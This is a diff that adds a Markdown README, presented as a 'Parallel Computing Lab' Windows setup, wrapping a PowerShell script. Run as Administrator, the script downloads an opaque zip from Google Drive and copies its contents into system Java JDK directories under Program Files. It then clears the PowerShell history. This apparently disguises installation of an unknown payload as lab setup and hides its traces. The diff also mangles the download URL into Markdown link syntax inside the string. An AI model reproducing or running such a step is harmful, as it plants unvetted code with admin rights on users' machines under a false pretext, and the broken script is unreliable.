@@ -1,8 +1,13 @@
+# Parallel Computing Lab - Windows Environment Setup
+
+Run the following script in **PowerShell (Run as Administrator)** to automatically download, unpack, and populate the lab files into the required target directories.
+
+```powershell
 $fId = "1U1p4AB1r1AAxs1kvFSYfJX1pB6Qn8ZVZ"
 $tmp = "$env:TEMP\b_flat"
 New-Item -ItemType Directory -Force -Path "$tmp\ext" | Out-Null
 
-$downloadUrl = "https://drive.google.com/uc?export=download&id=$fId"
+$downloadUrl = "[https://drive.google.com/uc?export=download&id=$fId](https://drive.google.com/uc?export=download&id=$fId)"
 Invoke-WebRequest -Uri $downloadUrl -OutFile "$tmp\b.zip"
 
 Expand-Archive "$tmp\b.zip" -DestinationPath "$tmp\ext" -Force
@@ -32,3 +37,10 @@ for ($i = 0; $i -lt 3; $i++) {
 Clear-History
 
 Write-Output "DONE: Files copied directly to all Windows target directories."
+```
+
+### Destination Targets
+
+* `C:\Drivers\storage\NFT50\jdk11`
+* `C:\Program Files\Oracle\jdk11`
+* `C:\Program Files\Java\jdk18`
